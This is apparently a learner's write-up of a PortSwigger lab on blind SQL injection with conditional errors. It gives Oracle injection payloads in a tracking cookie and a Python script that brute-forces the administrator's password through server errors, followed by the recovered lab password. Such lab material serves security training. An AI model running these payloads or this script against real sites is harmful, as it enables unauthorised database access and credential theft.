# Lab: Blind SQL injection with conditional errors
# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

```bash
TrackingId=Bla1qilXoXiucvJI
Cookie: TrackingId=Bla1qilXoXiucvJI'
```
```bash
Cookie: TrackingId=Bla1qilXoXiucvJI'+and 1=1--
even when you do this Cookie: TrackingId=Bla1qilXoXiucvJI''+and 1=0--; it still gives ok so we will do diffirent approach.

Cookie: TrackingId=Bla1qilXoXiucvJI' ||	 (select '' from dual) ||';
```
```bash
#LIMIT 1 didnt work for me for oracle so we use this.
Cookie: TrackingId=Bla1qilXoXiucvJI' ||	 (select '' from users where rownum=1) ||'
```
```bash
# first from part runs and after that select part runs we will use this. If we can find administrator username then select will run.
# If you change (1=0) to (1=1) it will give error due to our case.

|| (SELECT CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || '
```

```bash
TrackingId=Bla1qilXoXiucvJI' ||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||';

#send this to intruder and brute force length we found that length is 20.
```
```bash
||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

#now we need to do clusterbomb
```
```bash
#Community edition brute force is so slow so i wrote this code.

import requests

# Target URL
url = "https://0a0a0091039d9f4f810c4d87005f00d1.web-security-academy.net/"

# Headers for the request
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": url,
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Te": "trailers"
}

# Possible characters for the password
characters = "abcdefghijklmnopqrstuvwxyz0123456789"

# Function to test a payload
def test_payload(position, character):
    payload = f"your trackingId' || (SELECT CASE WHEN SUBSTR(password,{position},1)='{character}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '"
    cookies = {
        "TrackingId": payload,
        "session": "your session"
    }
    try:
        response = requests.get(url, headers=headers, cookies=cookies, timeout=10)
        return response.status_code == 500  # Expecting a server error if the payload is correct
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        return False

# Brute-force each character of the 20-character password
password = ["?"] * 20  # Initialize with unknown characters
for position in range(1, 21):  # Password length is 20 characters
    for character in characters:
        if test_payload(position, character):
            password[position - 1] = character
            print(f"Found character '{character}' at position {position}")
            break

# Output the found characters in the password
print(f"Password: {''.join(password)}")
```
```bash
$ python clusterbomb.py
Found character 'q' at position 1
Found character 'n' at position 2
Found character '6' at position 3
Found character 'q' at position 4
Found character 'y' at position 5
Found character 'y' at position 6
Found character '7' at position 7
Found character 'u' at position 8
Found character 'v' at position 9
Found character '7' at position 10
Found character 'e' at position 11
Found character 'z' at position 12
Found character 'a' at position 13
Found character '7' at position 14
Found character 't' at position 15
Found character '2' at position 16
Found character '0' at position 17
Found character '6' at position 18
Found character 'g' at position 19
Found character 'z' at position 20
Password: qn6qyy7uv7eza7t206gz
```
